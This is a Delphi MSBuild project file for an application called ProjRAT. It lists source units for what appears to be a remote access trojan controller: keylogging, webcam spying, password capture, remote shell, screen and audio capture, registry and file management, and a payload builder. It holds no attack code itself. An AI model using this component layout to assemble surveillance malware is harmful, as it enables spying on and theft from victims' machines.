<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ProjectGuid>{2bca8f87-5f52-4b8f-ae1b-1f71c61ef1c2}</ProjectGuid>
    <MainSource>ProjRAT.dpr</MainSource>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <DCC_DCCCompiler>DCC32</DCC_DCCCompiler>
    <DCC_DependencyCheckOutputName>ProjRAT.exe</DCC_DependencyCheckOutputName>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <Version>7.0</Version>
    <DCC_DebugInformation>False</DCC_DebugInformation>
    <DCC_LocalDebugSymbols>False</DCC_LocalDebugSymbols>
    <DCC_SymbolReferenceInfo>0</DCC_SymbolReferenceInfo>
    <DCC_Define>RELEASE</DCC_Define>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <Version>7.0</Version>
    <DCC_Define>DEBUG</DCC_Define>
  </PropertyGroup>
  <ProjectExtensions>
    <Borland.Personality>Delphi.Personality</Borland.Personality>
    <Borland.ProjectType>VCLApplication</Borland.ProjectType>
    <BorlandProject>
<BorlandProject><Delphi.Personality><Parameters><Parameters Name="UseLauncher">False</Parameters><Parameters Name="LoadAllSymbols">True</Parameters><Parameters Name="LoadUnspecifiedSymbols">False</Parameters></Parameters><VersionInfo><VersionInfo Name="IncludeVerInfo">True</VersionInfo><VersionInfo Name="AutoIncBuild">False</VersionInfo><VersionInfo Name="MajorVer">1</VersionInfo><VersionInfo Name="MinorVer">0</VersionInfo><VersionInfo Name="Release">0</VersionInfo><VersionInfo Name="Build">0</VersionInfo><VersionInfo Name="Debug">False</VersionInfo><VersionInfo Name="PreRelease">False</VersionInfo><VersionInfo Name="Special">False</VersionInfo><VersionInfo Name="Private">False</VersionInfo><VersionInfo Name="DLL">False</VersionInfo><VersionInfo Name="Locale">1031</VersionInfo><VersionInfo Name="CodePage">1252</VersionInfo></VersionInfo><VersionInfoKeys><VersionInfoKeys Name="CompanyName"></VersionInfoKeys><VersionInfoKeys Name="FileDescription"></VersionInfoKeys><VersionInfoKeys Name="FileVersion">1.0.0.0</VersionInfoKeys><VersionInfoKeys Name="InternalName"></VersionInfoKeys><VersionInfoKeys Name="LegalCopyright"></VersionInfoKeys><VersionInfoKeys Name="LegalTrademarks"></VersionInfoKeys><VersionInfoKeys Name="OriginalFilename"></VersionInfoKeys><VersionInfoKeys Name="ProductName"></VersionInfoKeys><VersionInfoKeys Name="ProductVersion">1.0.0.0</VersionInfoKeys><VersionInfoKeys Name="Comments"></VersionInfoKeys></VersionInfoKeys><Source><Source Name="MainSource">ProjRAT.dpr</Source></Source></Delphi.Personality><ModelSupport>False</ModelSupport></BorlandProject></BorlandProject>
  </ProjectExtensions>
  <Import Project="$(MSBuildBinPath)\Borland.Delphi.Targets" />
  <ItemGroup>
    <DelphiCompile Include="ProjRAT.dpr">
      <MainSource>MainSource</MainSource>
    </DelphiCompile>
    <DCCReference Include="afxCodeHook.pas" />
    <DCCReference Include="MainU.pas">
      <Form>MainForm</Form>
    </DCCReference>
    <DCCReference Include="uAbout.pas">
      <Form>Form8</Form>
    </DCCReference>
    <DCCReference Include="uAudioStream.pas">
      <Form>Form19</Form>
    </DCCReference>
    <DCCReference Include="uBuild.pas">
      <Form>Form9</Form>
    </DCCReference>
    <DCCReference Include="uCamspy.pas">
      <Form>Form7</Form>
    </DCCReference>
    <DCCReference Include="uConn.pas" />
    <DCCReference Include="uDownload.pas">
      <Form>Form14</Form>
    </DCCReference>
    <DCCReference Include="uFilemanager.pas">
      <Form>Form2</Form>
    </DCCReference>
    <DCCReference Include="uFlag.pas" />
    <DCCReference Include="uInformation.pas">
      <Form>Form6</Form>
    </DCCReference>
    <DCCReference Include="uKeylogger.pas">
      <Form>Form10</Form>
    </DCCReference>
    <DCCReference Include="uManager.pas">
      <Form>Form17</Form>
    </DCCReference>
    <DCCReference Include="uMini.pas">
      <Form>Form21</Form>
    </DCCReference>
    <DCCReference Include="uNihal.pas">
      <Form>Form20</Form>
    </DCCReference>
    <DCCReference Include="uNotify.pas">
      <Form>Form90</Form>
    </DCCReference>
    <DCCReference Include="uPass.pas">
      <Form>Form13</Form>
    </DCCReference>
    <DCCReference Include="uPlugin.pas">
      <Form>Form15</Form>
    </DCCReference>
    <DCCReference Include="uProcess.pas">
      <Form>Form5</Form>
    </DCCReference>
    <DCCReference Include="uProfiles.pas">
      <Form>Form16</Form>
    </DCCReference>
    <DCCReference Include="uRegistryeditor.pas">
      <Form>Form11</Form>
    </DCCReference>
    <DCCReference Include="uRemoteShell.pas">
      <Form>Form18</Form>
    </DCCReference>
    <DCCReference Include="uScreen.pas">
      <Form>Form4</Form>
    </DCCReference>
    <DCCReference Include="uScreenNor.pas">
      <Form>Form12</Form>
    </DCCReference>
    <DCCReference Include="userv.pas" />
    <DCCReference Include="uSettings.pas">
      <Form>Form1</Form>
    </DCCReference>
    <DCCReference Include="uTransferView.pas">
      <Form>Form3</Form>
    </DCCReference>
  </ItemGroup>
</Project>